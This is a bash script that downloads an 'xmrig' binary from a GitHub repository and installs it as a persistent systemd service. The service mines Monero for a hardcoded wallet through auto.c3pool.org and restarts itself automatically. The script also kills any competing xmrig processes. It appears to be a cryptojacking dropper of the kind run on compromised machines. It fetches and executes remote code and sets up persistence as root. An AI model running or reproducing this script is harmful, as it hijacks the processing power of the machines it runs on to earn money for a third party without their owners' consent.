#!/bin/bash
curl -L --progress-bar "https://github.com/gamemod5/auto/raw/main/xmrig" -o /tmp/xmrig
[ -d $HOME/c3pool ] || mkdir $HOME/c3pool
cp /tmp/xmrig $HOME/c3pool/
chmod +x $HOME/c3pool/xmrig
cat >/tmp/c3pool_miner.service <<EOL
[Unit]
Description=Monero miner service
[Service]
ExecStart=$HOME/c3pool/xmrig -o auto.c3pool.org:19999 -u 436mqed36G2Pbj2E42N7rEevBeybTX5GmAYqyNB7Zw4WaXCPGkhey8nCEE9bWHhot8Nb8AjGvBJny2p7k2LBT15nLb8Yyt8
Restart=always
Nice=10
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
echo "[*] Starting c3pool_miner systemd service"
killall xmrig 2>/dev/null
systemctl daemon-reload
systemctl enable c3pool_miner.service
systemctl start c3pool_miner.service
